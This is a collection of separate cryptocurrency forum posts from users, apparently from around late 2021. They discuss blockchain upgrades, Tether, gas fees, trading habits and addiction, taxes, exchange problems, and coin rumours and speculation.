Digital Ledger Technology has become a crowded and very competitive ecosystem. Given the pipeline of upcoming upgrades among the top 10 blockchains (sans doggos, stables, and memes) for the next 12 months, what do you think is looking to be the blockchain that has the most promising upgrade advantage?

Bitcoin BTC           -  Taproot, 

Ethereum ETH      -  The Merge

Binance BNB        -  ?

Solana SOL           - ?

Cardano	ADA        -  PAB, Hydra

XRP SRP                 -  ?

Polkadot DOT       -  ?

Terra LUNA           -  ?

Uniswap UNI        -  ?

Avalanche AVAX    -  ?

Which sites (other than the projects site and github themselves) magazines, podcasts, vlogs are good resources for these? Ones that make such comparisons of fundamentals. And ones that are not shills for particular coins? Appreciate any replies, thanks!

Since FB (world's largest social media platform) have changed it's name to META, have changed the concept of vertual world. It's no more just a debate it's reality now. Now the Vertual world will be the reality where life will be as normal as in physical world. Buying properties , weedings , jobs , houses and....... 

Meeting up all these thing needs metaverse coins which gives a clear indication metaverse coins are the virtual reality and these coins are way forward to make our fortune.

Please share your thoughts.

Tether has been in the news recently, especially after the [Report on Stablecoin](https://home.treasury.gov/system/files/136/StableCoinReport_Nov1_508.pdf) was out yesterday. In quite a few discussions I see (e.g. [here](https://news.ycombinator.com/item?id=29071895) and [here](https://www.reddit.com/r/CryptoCurrency/comments/qkn5tx/facing_reality_how_to_avert_a_potential/)), a lot of people think that there's no way there are actually 70B of proper assets backing up all the Tether in circulation, and that the collapse of Tether is just a question of when, not if. 

The validity of this projection aside, maybe I'm missing something obvious, but exchanges like Kraken actually [offer margin trading on pairs such as USDT/USD and USDT/EUR](https://support.kraken.com/hc/en-us/articles/227876608-Margin-trading-pairs-and-their-maximum-leverage). If somebody (probably a non-US-person who is allowed to do margin trading there) is convinced that Tether will tank, why can't they just go on such exchanges and initiate a short? Is the fear that the exchange itself will become insolvent after the crash, and you won't be able to withdraw your fiat out of it in the end? I'd be curious to hear thoughts on this.

American entrepreneur Zaryn Dentzel told police he was in his apartment with a technician when the assailants forced their way in, injuring him in the chest in a bid to get hold of his passwords.  Dentzel was left with a cut to his chest and was beaten by the criminal gang in a bid to obtain the passwords of his bank accounts and electronic wallets. The entrepreneur has been investing in bitcoin for several years and his fortune in this virtual currency could be worth millions of euros. As such, his accounts are likely to be protected with more levels of security than just a "password".

I'm a huge crypto fanatic and very deep rooted into it. It basically turned my very hard life into a much more manageable one. This is why I keep teaching my kids about it and surprisingly they're very interesting about the subject. 

I wish they taught it at school or universities at least. There are some universities like MIT experimenting with crypto classes and there are even blockchain projects like Studyum working on creating an online learning platform that is fully crypto compatible and has crypto rewards for students and teachers.

 If we teach our children about crypto from a young age, this will ensure the quick and imminent rise of crypto into the mainstream.

Hello to all. This is my first post here, but I'm a silent observer for months.
I started investing in crypto about a year ago and I've gained some nice profits, most of which are thanks to this community.
My first rule to myself in investing in crypto was to invest only sums I can afford to lose.
Lately, after seeing my profits, I broke my own rule and started investing money I can live with losing, but it will be painful to lose.
In the back of my head I want to invest all my savings in crypto, but for now I control myself not to.
I'm checking the charts any time I can, started neglecting myself and family. Any spare time I have, I look at the charts (and tell myself that I should have invested more and earlier). I didn't tell my wife about the last fiat transfer to the wallet becase I fear she might feel I'm losing it for the crypto...

I fear I'm becoming too addictive to a point I might forget the reasons I started investing in the first place, and will lose both my famly and the money.
Anyone here had the same feelings as I do? Did you do something to prevent yourselves from crossing the line?

Flash crash could be right around the corner, people will take profits it's the nature of the beast.

Not trying to scare anyone , just be prepared. Take profits, move to stable coins, whatever. Just don't expect endless rises day after day, it don't work like that. 

Euphoria is high and rightly so, my portfolio looks very tidy, but its at times just like these that a dip happens when everyone is getting high on hopium. Dont Panic, but just beware.

Whether you are an Eth staker or Shib soldier, good luck to all of you my friends.

The gas fees have been ridiculous, I stopped buying cryptos because of the high gas fees. 

I can't see how Ethereum will be sustainable going forward and I'm wondering why new coins are still created on Ethereum and not others coins. 

Even Binance has reasonable gas fees and I started now looking more what other interesting crypto projects are on Binance instead of Ethereum. 

I'm sure I'm not the only one who is getting a bit frustrated with the high gas fees. 

Do you think Ethereum 2.0 will really fix that problem?

For me the most annoying thing is when people ask me how many coins I own like I'm some kind of billionaire. Like honestly, what makes you think someone that looks like a homeless person that hasn't gotten a haircut or worn new clothes for years owns several Bitcoins or Ethereum? It's kinda annoying and  it unfortunately makes feel even poorer than I currently am.

So that makes me ask, what is the most annoying thing that people ask you when you tell them you invest in Cryptocurrencies (if you do tell anyone that is)?

So i had some discussion with my family lately about cryptos and what the gains look like.

At the moment i track all my cryptos on the FTX-app (former blockfolio) until a week ago i could tell +/- ~ how much money i had gained from my investments but that was due to myself really investing in crypto since not much longer than 6months and adding not more than 400$ into it the last 4-5 months so i could say well thats my winning and thats my additional investment of 400$ i made into a stable coin for yield farming and i could tell what my total win was at the end.
now im 2 weeks further in the diagram and i have for obvious reason an unreliable worth that wont represent my actual win 

is there any good app that shows me what my actual investment is? 

thx in advance

I am very grateful for discovering Bitcoin/Crytpo. Its intellectually demanding, novel, and will change the way the world works in ways we cannot comprehend as of now.

Also, it will hopefully help many of us achieve various levels of financial freedoms and understanding. 

On the other hand, there are so many Bitcoin maximalists out there on Twitter, Medium, etc. spewing utter anti-science BS, almost as though being right about Bitcoin being a successful project makes them experts on medicine, climate, sociology and so on. Its very disturbing and sometimes makes me dislike being associated with the project. Its proper painful listening to these degrees of self-righteousness and hubris. 

Rant over, thank you. Anyone else have this?

MATIC has been pumping hard since end of October and its not looking like its stopping anytime soon.

A project like MATIC with so many collaborations and such great technology deserves much more actually.

But Im happy with their current steady and healthy growth. And with more projects on the way, I dont think MATIC will be having any trouble breaking ATH this week. This is not financial advice but I would definitely be stocking up on MATIC right now. Its the perfect time to do so before they reach $5.

Pretty bad, right? But I guess everybody started that way, and got better learning lessons and sharing tips. So:

What are the most valuable lessons you learned during your Crypto-tour?

How could someone with not a lot of money enter the Cryptoworld without getting smashed by the market?

It has been one thrill of a ride and I enjoyed every moment.  The fact my asset is decreasing in value and the rising prices  of gasoline in my country, are forcing me to sell my asset. I might regret this decision afterwards, but I can't handle the stress anymore.

So for the lovers of fast motorcycle's, I'm selling my;

Yamaha YZF-R6 with 125 horse power (599cc). Built in the year 2017 with 21000 km on the counter. It comes with an

I know it's been a long ride since here, everything pumped so far as we expected but... i'm convinced that the new meme coin will be a cat coin. And this coin already exist ! In 6month from here we will be able to see this coin at least in the top 20, because we all know we don't need solid fundamental, we need to chill on a meme coin. Strong comunity, strong dev and nice looking website, we have all we need to pump to the moon ! You can change my mind guys, i just put some money into it and i'll see you next year talking about it. I think this is easy lambo ticket, and i hope you guys don't miss this as you missed like me shib.

Almost every screenshot I see on a Cryptocurrency subreddit is taken from Robinhood. I can't understand why anyone would use that app. Perhaps they are ill-informed or just a newbie, but Robinhood is just overall terrible for Crypto.

Not only can you **NOT MOVE YOUR CRYPTO OUT OF ROBINHOOD**, **STAKE or YIELD,** But Robinhood has literally stopped people from buying stocks because of some billionaires earlier this year. What on earth makes you think they'll be a safe place to keep your Crypto??

There are so many better exchanges to keep your Crypto in, and even better, a cold wallet which is even safer. Not only would your Crypto be **ACTUALLY YOURS,** but you can also stake and earn interest on it. So if *you are still using Robinhood, please do yourself a favor and switch.*

Banks have always been against Crypto and were previously  involved in spreading FUD but went successful . Now we can see Banks embracing crypto.

 In 2014, as regulators in New York were exploring ways to control Bitcoin, executives at Wall Streets biggest banks fretted that regulating cryptocurrencies would also legitimize them  and that could threaten the finance industry. So they tried to sow doubt. 

 At the World Economic Forum in Davos that year, Jamie Dimon, the chief executive of JPMorgan Chase, the nations largest bank, called Bitcoin a terrible store of value that was also being used for illicit purposes. At a meeting to discuss violations of Iran sanctions, H. Rodgin Cohen, the finance industrys pre-eminent lawyer, warned the states regulators that the federal government was very worried about Bitcoin and its use. ([source](https://finance.yahoo.com/news/jamie-dimon-thinks-bitcoin-worthless-171125840.html))

 Those efforts failed. New Yorks Department of Financial Services began issuing licenses for Bitcoin businesses in 2015.  

 There are now more than 75 million users of Bitcoin, up from around three million seven years ago, and the number of digital currencies has exploded. Globally, 220 million people use cryptocurrencies [source](https://crypto.com/)

&amp;#x200B;

 Now the banking industry is racing to catch up. Banks want to compete in this new world and profit from it. Their approach is two-pronged: experimenting with cryptocurrency offerings and lobbying regulators to create rules that work in the banks favor. Some are offering cryptocurrency investments to their wealthy clients. Others are weighing trading desks for Bitcoin. JPMorgan even started its own digital currency in 2019. 

 Cryptocurrency start-ups are beginning to offer credit cards and loans. People and businesses around the world are embracing digital currencies at a rapid pace. Even governments are getting involved. El Salvador recently said it would [accept Bitcoin as legal tender](https://www.nytimes.com/2021/10/07/world/americas/bitcoin-el-salvador-bukele.html). And the Federal Reserve, following in the footsteps of central banks around the world, is evaluating [launching its own digital currency](https://www.nytimes.com/2021/08/05/business/economy/fed-digital-currency.html). 

 Digital currencies, which let individuals bypass banks in money transfers, sales and business collections by connecting people instantly without an intermediary, are threatening to take away that central role banks play.

Hello folks, after a good bit of googling lI'm hoping for some tips on buying coin as a US Citizen living overseas. I live in the UK as a student where have established residency for tax purposes as well. Is there a way to purchase coin? 

Everywhere try won't accept me since am living in UK. Anything I should know for tax purposes? know have to report to both governments.

The only success I have had is buying Bitcoin through Paypal. This is becoming a huge pita.

I just wanted to inform you guys that you can mine with your pc during your example going to work, having a drink with your friends or the like. It doesn't matter if you only have 1 GPU, it's better than nothing. I also mine when I go to school, or go out to friends with 1x 3070 and I achieve 60MH/s and 114W power draw. I achieve that thanks to the overclock and I could help you guys with that if needed. 

That means I now achieve $4.85 per 24 hours so if I am away for half a day sometimes I have another $2.42 added \*\*in Ethereum\*\*. Ethereum profitability is very high at the moment even if you only have a 1660 say, see screenshot below! 

[Profitability of my Gigabyte Gaming OC 3070](https://preview.redd.it/mhhwttzuqcx71.png?width=1214&amp;format=png&amp;auto=webp&amp;s=0426c291111138844c59c10aef7e778b574f0d15)

[As you can see, it is better to just mine the coin with highest profitability and  just swap it if you don't want Ethereum](https://preview.redd.it/bwwkg2n1rcx71.png?width=1209&amp;format=png&amp;auto=webp&amp;s=04aaf1996adbc3a2c4f7e995b8508df375924cdb)

If you want to buy another coin, mine Ethereum and withdraw for example in Ethermine as L2 Polygon Network so you pay $0.01 fees with MATIC. This way you avoid the high fees and can buy another crypto if you wish! I hope this has given you enough information and thank you for reading this!

Hello r/cryptocurrency community, 
I am studying Environmental Management and I have recently finished a research project on Ethereum's future energy consumption under Proof-of-Stake. 
I have originally posted this in r/ethfinance but was asked to share it with those of you interested as well.    
[You can find the full report here](https://www.dropbox.com/s/f1nle6ioiyz5wbf/%E2%80%98Proof-of-Stake%E2%80%99%20as%20a%20solution%20to%20the%20blockchain%20energy%20problem.pdf?dl=0)    

**For all others, I'll quickly summarise the results:**

[Ethereum (mining) is currently estimated to use around 80 TWh of energy annually.](https://digiconomist.net/ethereum-energy-consumption)
 
I tried to model energy consumption for Proof-of-Stake.    
Currently there are about 250,000 active validators. I split validators into two categories: private stakers and institutional stakers. Private stakers are people running a setup from home (or hosted on a cloud server). Each staker currently runs 5.4 validators on average. Because they probably don't have setups optimized for energy consumption, I estimated every staker to use 100W of energy, so about 18.52W per validator.
For institutional stakers, such as exchanges, I used 5 W per validator, as suggested by [Carl Beekhuizen from the Ethereum foundation](https://blog.ethereum.org/2021/05/18/country-power-no-more/). Currently about half of validators seem to be run by each category. **This puts the current estimated energy consumption at 2.94 MW or 25.754 GWh annually.**    
 
For the future I have considered a limit of 524,000 validators as proposed by Vitalik in the past. I made one model assuming the share of private vs institutional stakers remains 50-50 and one that assumes a shift towards circa 25-75, since there will probably be more people using staking services rather than setting up new own validators in the future. **The last scenario, which I find to be more likely, puts power consumption at 4.31 MW or 37.756 GWh annually** (the 50-50 scenario would mean 6.16MW / 53.98 GWh annually).    
**Overall, the transition to Proof-of-Stake represents a decrease in energy consumption by at least 99.93 to 99.95 percent compared to current PoW**    

So instead of using as much power as the entire country of Chile, Ethereum will only use the equivalent of between 710 to 1650 average Australians in the future.    

Of course those numbers could change slightly in case the maximum number of validators ends up significantly higher or the stake needed for a validator were to change, but this model at least is able to demonstrate the magnitude in difference for power consumption between PoW and PoS.    

PS: Please don't be too harsh on my report, the main focus was on the environmental impact of Ethereum and the technical details are very simplified. If you want to share my report somewhere, please dm me.

This isn't address to people that have some money on the side and are waiting for the next dip to buy more. But rather to those that lurk on here, know about crypto, but still have decided either not to invest or are holding out putting in the majority of their investing money. 

I just want to know why didn't you invest during the dip and why haven't you invested now during this bull run? Do you think that the market is going to tank, and if so, is it worth the wait when you could be enjoying all these new ATHs? What is your target price with certain coins? I just would like some alternative things from the current hype craze and to get some opinions going.

I used to love the guy. The Bourne series was one of my all time favorites. Lost count of the number of marathons I've had of the first 3 movies in the series. Departed, Rainmaker, Rounders, Green Zone.. even that movie with the tiny-ass people. What a fucking legend of the industry. 

But now, for what seems like fucking millennia, every second ad on Reddit is Matt Damon telling me "Histroy is filled with almosts". Yeah no shit Matt, I almost uninstalled this app so I wouldn't have to watch that shit again. I can't believe I'm saying this, but I'd rather listen to Billie Eilish telling me where her fucking creativity starts in that Adobe ad. Okay, maybe not. But still, I contemplated. 

All jokes aside, I fucking love Matt Damon and it is awesome that he's pumping my CRO bags. Nobody here is talking about CRO and Crypto.com, but the token has steadily and consistently doubled in value in the past month. Love the exchange for making me hold CRO for those extra rewards. Not to mention their Visa cards look sick!

Their advertising has been immense lately, and I think CRO is gonna go to some extreme highs this bull run. 

Thank you Matt, truly. 

What's your favorite Matt Damon movie?

For example ada, sold around 60%, but selling all of them is really hard for me. And the same with every other coin, I'm wondering if I'm the only one who's not able to sell 100%?
Sometimes it feels like an addiction, like I would miss something if I'm selling the full amount. 
My question is, is anyone else handling this like me? 
When you sell a currency completely are you still checking the charts? Do you regret selling "100%" in the past? 
Also I want to know how some of you decide at which point you are selling, do you have a personal goal or is it only a mood thing? Would appreciate to read some experiences you made and some tips or suggestions how you're handling the sale?

right now the market is up big time and I see a lot of talk about taking profit. I'm in a situation where my protfolio is very much in the green, but I'm nowhere near my financial goals. So taking profits is out of the book for me. But i also do not really know what i want to invest in this month following my DCA plan. What are you guys buying this month? Which coins do you expect to still reach new ATHs? Or are you holding back your DCA money and wait to invest when the market dips again? I kind of don't want to increase my average price per coin/token that much but on the other hand to reach my goals i have to invest more money and i don't think we are at the end of the bull yet.

Ever since getting into crypto I've been paying closer attention to what I spend my money on and I've been surprised by how much money I spent on unnecessary stuff.

So I've been thinking to make a list as an example of how much you can save and put into crypto by cutting the unnecessary costs, so here we go.

I used to smoke a pack a week which cost me $7 pack
Quit smoking now and it's better for my health and wallet.

$7 x 52 = $364

Went out almost every weekend, sometimes even twice which costs me roughly around $50 a week.
Almost completely quit drinking and the cost of beer and such is now calculated in my supermarket expenses.

$50 x 52 = $2600

Didn't really pay attention to prices in the supermarket and once I did, I cut down my monthly costs by about $30-$40, so let's say $35 a month.

$35 x 12 = $420 (ow yeah!)

Used to game a LOT and spend money almost every month on a new game. $40-$60

$50 x 12 = $600

Started paying attention to heating and gas usage throughout the month.
It's not much, but it saves me around $20 a month

$20 x 12 = $240

Add all of this up and you get a staggering $4224!
I never realised I spent roughly the price of 1 ETH (currently) a year on unnecessary things.

If I started paying attention a year earlier and invested it in ETH I would have done a 10x on that investment.


Now ofcourse I'm looking for more ways to cut the costs. (Strangely enough it's addicting)
If you have any good tips to save some more money, be sure to let me (us) know!

As we know the general feeling is that the alt season is around the corner. So basically just tell me what altcoins  are gonna boom if the speculation of alt season is correct. We are already seeing good gains in some alt coin projects. I have some fiat aside to put into crypto for a long time now waiting for a huge crash which isn't just coming so might as well try my luck in some alts. 

Please don't suggest the ones in top 100 by market cap, i already have a solid bag which I've been building since 6 months of extremely promising projects. Need to know about some unheard projects, will invest in few and let you all know how it went!! Go mad thank youu.

(What our economics professor said to us last year)

With the massive debt of the United States and the politicians hating each other and willing to do anything to sabotage the opposing party there is a good chance that The United States  might default one day and massive economic collapse is immanent. There is a potential future where the value of the dollar could drop 30% if not more and cryptocurrency maybe the savior of many people that have invest 8n this digital money. We might move into a world where cryptocurrency is king and a much more stable currency because we have kept government out of it for now.

(What are your thoughts)

At that time, ETH was $10.30

BTC was $907.94

ETH is now more than 4.5x the price that BTC was then, when I considered BTC to be near the top

Just goes to show that time is your best friend in crypto. Just hodl and have faith in your coin if it's a good project

And no, I never thought ETH would go to this price. My initial goal was ETH to $150 or so in a few years 

And no, I'm not rich because I didn't buy much, and wasted a lot trading for shit alts during 2017

For the last few days, Ethereum has been breaking ATH and nobody is talking about it? Yeah, I know, ETH is just 10% up since last week, but it's still breaking ATH. Ethereum is starting to make big moves, but this is just the beginning. Once Ethereum FOMO starts, we will break the $10k goal. Remember that ETH last year was at $400, whereas now is sitting at $4590. 

I know that some of you hate ETH for having ridiculously high fees, but you cant deny the fact that ETH is the most trusted smart contract chain, with an enormous financial ecosystem. Im very excited to see how high will ETH reach this market cycle, what do you think?

Hello fellow humans, could you help me understand the difference among the generations of block chains?

Obviously Bitcoin is generation 1 blockchain built on proof of work. It is also the first mover in the market and limited cap. The. You have ethereum and erc-20 which I believe is a generation 2 blockchain. Is that because it is moving to proof of stake from proof of work? Or more because of the ecosystem of tokens on its network. I know smart contracts can further build on the block chain along with layer 2 protocols I just dont know if that means anything for the technology generation of the blockchain. 

That brings me to my main question, what if anything defines a blockchain as generation 3? Are there current tokens/chains that fall into that category? And lastly, what do you think generation 4 will look like? I recognize this is both technical and speculative so there may not be an answer, but I am interested in others thoughts. I also may be completely off thinking of blockchains as generation upgrades. If I am wrong, please help me out.

I have been reading posts on this sub for months now and I wonder why people sometimes is so aggressive and mean towards others, especially those in need. 

All this crypto thing is not a game, at least not for everybody. Someone is taking risk, even is tiny, to build a better future and sometimes can happen to make mistakes, so what?

try to be respectful or helpful, or just avoid to comment with this malice.

People got scammed because they have been naive or distracted?  well... being happy and throw a party will not change your own wallet situation, it will only makes others feel like shit and the crypto industry to appear like a big scam to the eyes of the mass, and nobody want this, or at least shouldn't 

for those who receive this wickedness and malice, just ignore it... there is plenty of nice people in here so keep asking for help or support if you need

I wrote the last two posts on Loopring, which seemed to help and educate a lot of people on their potential partnership with some large companies.

I wanted to talk about why Loopring and NFTs are being linked to GameStop.

**What is GameStop?**

If you dont follow the news or anything financial, GameStop is a company which sells video games, consumer electronics, and gaming merchandise retailer. For a while, GameStop had (and continues) to have a lot of selling pressure by large companies who wanted to see it crash, so they could gain financially. However, the loyalty of its customer base and shareholders has prevented this, and have turn the hooks on companies which shorted it. It has defied anyone who has gone against it, and is continuing to grow. It has also made a lot of people a lot of money who hold the shares.

It has a true following which is loyal and unlike any other company around, and people are willing to keep buying it to watch it succeed. This is what we call a golden supporter base. Apple has it with its products. Samsung with theres. GameStop has the same thing.

**Why is GameStop getting into NFTs?**

A NFT is a single asset usually embedded in an object (like a video game skin, for example) and registered in a blockchain network. It is an encrypted digital record of a piece of art that can be bought, sold, and collected. NFTs, meanwhile, have been on their own popularity surge as everyone from traditional auction houses to billionaires began selling the unique digital collectibles.

GameStop announced they would enter the NTF arena, to a great uproar from customers and shareholders. This was further enhanced by them launching a NFT website: htps://nft.gamestop.com/

GameStop will be launching its platform on the Ethereum marketplace. The NFT marketplace is expected to reach 1-2 trillion dollars in sales in the next few years. With GameStop at the heart of the gaming industry, it has the ability to capture a large part of the gaming market with its NFTs. With large gaming companies, and large movie producers looking for a industry leading platform to sell their NFTs, GameStop would be the perfect place for them to get exposure, whilst increasing their revenue through there NFT marketplace.

**So Why are GME Holders So Excited and Buying Up Loopring?**

The Head of GameStops Blockchain is Matthew Finestone. The reason why many are getting excited is that he was Head of Business for Loopring before moving to GameStop. He was responsible for bringing business to Loopring, whilst onboarding other companies onto the Loopring system. One can assume that if GameStop needs a reliable, secure, and fast platform, then they would ask their Head of Blockchain where to go. In this case, it could potentially be Loopring. After all, Matthew Finestone did work for the company. He would potentially know everything he needs to know about the Loopring platform, and could integrate both companies together quite easily.

Furthermore, GameStop is building a team of engineers, designers, gamers, and marketers to really create a NFT platform which is next generational, and the best in the industry.

This along with Ryan Cohen who is known for launching and turning around businesses to make them reach new levels, meaning that backing Loopring and GameStop on a potential partnership could be rewarding for holders.

**So, What Does This Mean for Loopring?**

Loopring (before any rumours of GME came out) have stated they are going to be launching a free wallet (maybe this wallet can be provided to all users of the potential GME platform). They also stated that a big announcement is coming in Q4 which would be worth 10 times more than any announcement/quarterly report they would announce. **Possible rumours include Ubisoft.**

This along with rumours that are working with an established partner who is building atop our newly released L2 NFT functionality, is why GME and Loopring holders are pretty excited to see what happens.

**I hope it helps to why people keep linking GME and Loopring together. If this partnership is real, then you are linking a viral powerhouse with GME (whos holders actually care about the company passionately), and Loopring (who has a game changing NFT platform to scale any company), which can cause an immediate impact to the global NFT marketplace.**

With the constant growth of crypto and hearing more and more people talk about it, i've started to wonder what everyones goal is. I can think of quite a few reasons why people might start to invest. 

Do you want financial independence and/or retire early?

Do you want that sweet new Audi or Mercedes?

Do you want to travel around the world?

Do you want to buy your dream (second) house?

Or is it more humane, like having the money to be able to help when a family member or a friend is in need?

What do you want to achieve?

I'd love to hear your stories!

Hey all!

So, i'm pretty new to the crypto world and im wondering if someone can shed some light on wallets.

If when i transfer X amount from coinbase to my wallet, i then lose track of how much is made on said purchase. So if i make 10 purchases and lose track of how much ive bought etc is there a way to track how much you have made + or - overall?

Hope that makes sense, or if im way off the mark can someone advise me on whats the best way to track it all even if it means using different wallets.

I'll eventually go down the road of a hardware Ledger Wallet once I accumulate enough to justify

Cheers and happy wednesday!

I posted this yesterday in the LRC sub but didn't get any attention, so thought I'd give it a shot here...

In case anybody has doubts about the legitimacy or potential of the project, here is an interview from this past summer where ETH co-founder Vitalik Buterin discusses zkRollups and specifically Loopring. I've linked to the segment where this is discussed, but I recommend watching the entire video when you have time

[https://youtu.be/XW0QZmtbjvs?t=4266](https://youtu.be/XW0QZmtbjvs?t=4266)

I recently discovered LRC right before it exploded, and I've been a little worried that it will fall back down to prior levels, especially if the GME rumor ends up being just a rumor.  After spending more time researching and watching videos like this I am confident this is a solid project with huge potential regardless of what happens with GME.  That would just be the icing on the cake...or the fuel in the rockets.

I sent 11.3 solana to my wallet, its confirmed on the blockchain the wallet has 11.3 sol ( yes i double checked its my wallet exactly holding on the explorer but not on KuCoin) , its been over 2 hours , everybody knows solana is one of the fastest blockchain , according to the required amount of confirmations it would take 2.5 minutes to reflect in my account , its been 2 hours.

5 days ago I had this problem with terra UST, and it took 4 days for KuCoin to send to me.

Now lets see how long it takes again its absolutely unbelievable at this point 

Not to mention the plethora of similar posts for other cryptocurrency throughout the KuCoin subreddit .

*Real estate* can and is taken by the government if they find something they don't like about you or sometimes [just because they can](https://www.theolivepress.es/spain-news/2021/03/04/dozens-of-homeowners-in-spains-balearic-islands-forced-to-turn-empty-properties-into-social-housing/) and bounds you to specific country rules which might be very restrictive as to what you're doing and where you live.

*Gold* can be easily taken by the government forces as well, no matter how well you will hide it, it will be found and you are not able to privately move it around [between countries](https://timesofindia.indiatimes.com/city/jaipur/gold-worth-rs-22l-seized-at-airport/articleshow/86331892.cms).

*Bitcoin* and alike can be marked and even blocked in very near future so you won't be able [to even move it](https://news.bitcoin.com/marathon-mines-first-ofac-compliant-bitcoin-block/) if you don't comply with ever growing government tyranny.

*Ethereum* and alike are just premined, centralized entities that are easy target for the government.

And of course banks that can seize your assets [anytime they want](https://np.reddit.com/r/Monero/comments/pes2vu/citibank_seizes_ops_funds_and_hands_it_over_to/), because it is never your bank account - it is bank account on your name.

All this mentioned assets are controlling the one that holds it due to the need of obeying **every** existing and new rules to come from the small hand of powerful government masters and even when obeying you can still lose your assets due to national crisis or other factors - in which you have no control.

**Free yourself, use Monero.**

When I was 18 i've been introduced in the World of trading by my uncle. He heard my brothers and I get some money and he was financial consultant. He proposed us to following him with trading if we had some money to work with. One of my Big brother go to Luxemburg to create an account via bank on the plateforme WHSelfinvest. 
The instruction was u wait next to your computer and when I tell you to buy or short you just have to listen to me.. I did it for 1 month and we lost our 10k invest with my uncle xD BUT I remember the day I did the opposite of what he said and I earn profit, and when we had no more fiat on the account i remember that day and the potential of trading so I decided to put 3k more and try by myself. 
Because of our big lost I decided to use a PAPER WALLET and trust me or not during 1,5 month I was watching NASDAQ every single second trying to understand what is going on, thanks to my paper wallet I could try every single idea I had, comfirm supposition, prove me wrong,...  and I was so invest in my paper wallet that every euro I Lost was a Big teaching lesson for me.
So, After 1 month and half I decided to jump into it. Even I was drilled with my paper wallet, I felt a lot of stress when placing my order the first day. During 2 weeks I pucked and had stomach problems due to the stress when trading with high risk but I kept doing it because I was feeling the NASDAQ... Like I Said trust me or not but during this month I traded I didnt had a single day Lost, I was earning between 75-400 per day 

Story is not finished but I finally asked my question maybe everyone is tired of it 
: is there any good crypto plateforme with a wallet paper for futur contract with not first huge deposit ??
Thanks you all guys if someone answer me I really want to Come back but with crypto this Time

Hi folks,
               Got a question and would appreciate advices.

I put some money on a coin few months back. For some reason the devs paused the project and now are planning to relaunch with fewer number of coins. The are requesting the holders to send the current coins to their dev wallet address and they will send the new version coin back however lesser number.

Question

Can I trust and send the coins to that address? Loosing those coins is one thing, but can they get my wallet address and mess around with it after I transfer; of course am to gonna share the phrases!

Hey all!

So, i'm pretty new to the crypto world and im wondering if someone can shed some light on wallets.

If when i transfer X amount from coinbase to my wallet, i then lose track of how much is made  on said purchase. So if i make 10 purchases and lose track of how much ive bought etc is there a way to track how much you have made + or - overall?

Hope that makes sense, or if im way off the mark can someone advise me on whats the best way to track it all :)

Cheers and happy wednesday!

Hey guys!

Am I the only one getting cult vibes from r/SHIBArmy. I mean those people are putting their children and blood into this and running towards "THE DREAM" of getting rich blindly with no safety....

I mean you need to have some plan but they would lose 2ks and 10ks and then buy the dips??? I don't see why it would be shameful to save the profits and then buy the dips???

It feels like the (Army) is filled with 6th graders with a narrow vision of what getting rich is about and they are all following it religiously.  

Idk man, I don't think they will get anywhere, but yet look how much profits religions made from a similar mindset.

Enough smartassing for the day.

Sorry, I know this is a very basic question, but I'm a true noob here, as in I intend to enter the crypto world I'll begin with an amount of 50 $ to minimise the risk, since my goal is to learn.

So, I understand I need to have an account in a platform like binance and put the money inside so that I can invest them in a wallet. 

What do you suggest is the best way to start ? And is there someone who would be able to coach me? Thanks in advance guys.

Hi, it's mister nobody here with an opinion.

I keep seeing posts like "Don't talk about your Crypto" or "This guy got attacked stolen something something".

The comments on said posts are all like "Yes, don't talk about anything to anybody". 

While that is always a good idea to keep your mouth shut a little, that doesn't mean you will get mugged and beaten. Stop living in fear, not everyone is standing there waiting to rob you. There are tons of well known people that have tons of money, and they aren't all getting mugged everyday. Not the entire world is bad, and there are more good people out there than the bad ones.

So what I'm saying is yeah keep it shut, but don't be scared to talk about crypto and the benefits it can bring to society. 

(And unless you have many millions, stop thinking that 10k or even 100k is a lot of money, you can barely to anything with that money today, it's something but it's not "fuck you money")

Ive got about $1kAUD in my Binance account and $1kAUD in my Coinbase account. Mainly on eth with a few alt coins sprinkled in. Every time I read about people buying SHIB, for example, they always bought months ago, month prior to me ever getting an alert on my phone that Binance/Coinbase is now trading on that platform. Im obviously retarded for using Coinbase/Binance but, as a simpleton, the UI (read: pretty colours) makes it user friendly, its just missing the slot machine sounds when I buy. 

So how do most people hear about new coins and then trade them as soon as theyre able to?

I'm in the process of teaching myself everything I can possibly understand about crypto. I'm still finding the fee stuff (gas, spread, exchange fees) pretty confusing, as well as how to move crypto (swaps, transfers, withdrawals, etc).  

What I'm wondering is (and if you can add to it any ELI5 clarity about the above things I mentioned), with the concept of arbitrage, how could you do it so it would be profitable? I'm NOT considering getting into it, but my confusion about fees and moving crypto makes me not understand it.  

For example, I see different prices for currencies on crypto.com and coinbase. Let's say I was to buy at a lower rate on coinbase, and then want to sell at a higher rate on CDC, how would I get the currency from one to the other without losing so much that it makes the profit negligible?  

I still don't really understand places like pancakeswap either - I understand you have to connect a wallet like metamask. So if all my crypto was on CDC but I wanted to buy a token that wasn't listed there, what are the options for getting the appropriate currency to the right wallets/exchanges?  

I hope this is clear and I appreciate any in depth answers for dummies that you can provide. I've spent a good week up to my eyeballs in crypto education, but some stuff is still really hard to make sense of no matter how much I research.

Not sure if this is the right place to post, but here goes. I got into crypto in 2020 and have been trading in small amounts, but mostly hodling. Charts, graphs, make me X\_X... I recently discovered copy trading but haven't found one that's platform agnostic and works with major exchanges.

So I thought about building one. It'll be simple by having alerts sent to Telegram, Discord or Slack to start. No predictions, no portfolio management, just signals. Experienced traders can set their monthly subscription fees.

Wanted to post here to see if this is something people would use, or is there something good out there already?

I've also joined groups where people post price alerts, but there are way too many messages to keep up with.

    I have the problem of being right at the cusp of making over $125K this year due to my crypto gains. Since I was flying high at tax time I fully funded (for the first time) my ROTH IRAs for both 2020 and 2021 and went all-in on Grayscale. That investment has (obviously) more than doubled tax free! Sweet!
    
    ...but now I realize from my other crypto trades and a good year at my day job I'm about to make $125K+ and if I take any more profits in crypto this year I'm going to make my IRA contributions ineligible and the growth they have received since taxable! This is a nightmare scenario, though I admit one that's hard to "complain about"...first world problems and such.
    
    Anyway I realize that my employer's SIMPLE IRA plan could be a way out of this situation if I just tell them for the rest of the year contribute 100% of my pay to that plan and I'll cash out my TRAC gains right quick and that should cover my expenses for the rest of the year. Is this a good idea or is there a safer way to make sure that I don't invalidate all that tax-free money on my ROTH for 2021?

Are you seeing the same feelings around the market as you did last time around? I personally think we're coming towards the end of the Bull Run before we enter this multi-year Bear Market. Within the Crypto market it seems like there's lots of news coming out about companies accepting Crypto and general widespread 'adoption' is coming. Of course, El Salvador is the first country to make it legal tender, but 4 years ago did it feel as if crypto was actually about to break out into wide-spread adoption?

